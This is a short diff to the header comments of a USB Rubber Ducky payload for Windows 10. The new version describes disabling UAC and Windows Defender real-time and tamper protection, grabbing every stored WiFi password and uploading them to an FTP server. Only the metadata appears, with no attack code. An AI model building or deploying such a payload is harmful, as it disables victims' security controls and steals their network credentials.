@@ -2,19 +2,19 @@
 # Rubber Ducky UAC and AV deactivation script
 
 
-REM Title:         Disable_UAC_and_AV
+REM Title:         UAC, Windows Defender and WiFi Grab via FTP
 
-REM Description    Disable UAC and download py script to disable Realtime and tamper protection
+REM Description    Disable UAC and download py script to disable Realtime and tamper protection, after this the ducky will grab alll wifi passwords the device has and upload them to an ftp server defined in the payload.
 
 REM Author:        FX17
 
-REM Version:       1.0
+REM Version:       2.0
 
 REM Target:        Windows 10
 
 REM Attackmodes:   HID
 
-———————————————————————————————————————————————————————————————
+—————————————————————————————————————————————————
 
 Be sure to edit the .txt file lines 96, 99 and 102.
 
